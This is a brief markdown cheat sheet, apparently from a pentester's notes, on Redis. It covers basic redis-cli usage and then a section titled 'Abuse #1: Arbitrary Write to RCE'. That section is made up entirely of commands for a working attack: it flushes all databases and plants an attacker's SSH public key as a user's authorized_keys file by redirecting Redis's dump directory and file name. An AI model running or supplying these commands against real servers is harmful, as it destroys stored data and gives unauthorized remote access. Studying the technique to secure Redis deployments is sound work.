---
title: "Redis"
date: 2025-7-25
tags: ["Redis-Cli", "Redis", "Exploitation", "Database"]
---

### General

```console
# Connect
redis-cli -h 127.0.0.1
```

```console
# Provide password
auth <PASSWORD>
```

```console
# List current keys
keys *
```

```console
# Add key
incr key
```

```console
# Get key value
get key
```

---

### Abuse #1: Arbitrary Write to RCE

```console
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
```

```console
# Deletes all keys from all databases on current host
redis-cli -h 127.0.0.1 flushall
```

```console
cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit
```

```console
redis-cli -h 127.0.0.1 config set dir /home/<USER>/.ssh/
```

```console
redis-cli -h 127.0.0.1 config set dbfilename "authorized_keys"
```

```console
redis-cli -h 127.0.0.1 save
```

